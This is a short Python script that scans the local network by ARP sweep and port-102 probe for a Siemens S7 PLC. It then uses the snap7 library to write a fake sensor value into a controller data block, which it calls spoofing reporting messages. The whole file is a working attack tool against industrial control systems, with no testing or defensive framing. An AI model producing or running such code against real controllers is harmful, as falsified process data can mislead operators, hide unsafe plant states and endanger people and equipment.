import snap7
from snap7.util import set_real
import socket
import struct
from scapy.all import ARP, Ether, srp


def find_plc_ip():
    """
    Scans the local network to find a Siemens S7 PLC by checking open ports.
    """
    ip_range = "192.168.1.0/24"  # Adjust based on your network
    print(f"Scanning network {ip_range} for Siemens S7 PLC...")

    # Send ARP request to discover devices in the network
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip_range), timeout=2, verbose=False)

    potential_plc_ips = []
    
    for sent, received in ans:
        ip = received.psrc
        try:
            # Try connecting to port 102 (default for Siemens S7 PLCs)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            result = s.connect_ex((ip, 102))
            if result == 0:
                print(f"Possible Siemens S7 PLC found at {ip}")
                potential_plc_ips.append(ip)
            s.close()
        except Exception as e:
            pass

    if potential_plc_ips:
        return potential_plc_ips[0]  # Assuming the first valid IP is the PLC
    else:
        print("No PLC found on the network. Exiting...")
        exit()


def spoof_reporting(plc_ip):
    """
    Connect to the PLC and spoof reporting messages by modifying a memory area.
    """
    plc = snap7.client.Client()
    
    try:
        print(f"Connecting to PLC at {plc_ip}...")
        plc.connect(plc_ip, 0, 1)  # Rack 0, Slot 1 (default for S7-1200)

        db_number = 1  # Adjust to match your DB number
        fake_value = 1234.56  # Example of spoofed sensor data

        data = bytearray(4)  # Allocate bytes for a 4-byte REAL value
        set_real(data, 0, fake_value)  # Insert fake float data

        # Write the spoofed value into the data block
        plc.db_write(db_number, 0, data)
        print(f"Spoofed reporting message sent! Set DB{db_number} to {fake_value}")

    except Exception as e:
        print(f"Failed to spoof reporting message: {e}")

    finally:
        plc.disconnect()


if __name__ == "__main__":
    plc_ip = find_plc_ip()
    spoof_reporting(plc_ip)